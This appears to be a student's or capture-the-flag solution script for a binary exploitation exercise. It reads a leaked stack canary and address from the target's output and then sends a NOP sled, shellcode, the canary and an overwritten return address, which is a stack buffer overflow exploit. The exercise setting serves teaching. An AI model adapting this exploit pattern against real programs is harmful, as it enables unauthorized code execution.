#!/usr/bin/env python3

import scaffold as p
from scaffold import SHELLCODE
import sys

# Configure Python to print text strings like byte strings. Don't remove this!
sys.stdout.reconfigure(encoding='latin1')

### HELPER FUNCTIONS ###

def int_to_bytes(x: int) -> str:
    return x.to_bytes((x.bit_length() + 7) // 8, 'little').decode('latin1')

### YOUR CODE STARTS HERE ###

# Program start:
p.start()

it = p.recv(117)
#print(it)


can = it[65:74]
print(can)

xc = int(can, 16)

at = int_to_bytes(xc)

holder = it[109:117]

print(holder)

hh = int(holder, 16) + 41

ht = int_to_bytes(hh)




#print(at)

#print(can[28:38])


#print(len('\x90' * 72 + SHELLCODE + '\xca\x94\x04\x08' * 8 + '\n'))

#print(len(SHELLCODE))

#print(len('\x90' * 184 + SHELLCODE + at + '\xa9\xf6\x62\x56' * 4 + '\n'))



p.send('\x90' * 184 + SHELLCODE + at + ht  * 4 + '\n')




# Example receive:
#assert p.recv(5) == 'test\n'

### YOUR CODE ENDS HERE ###
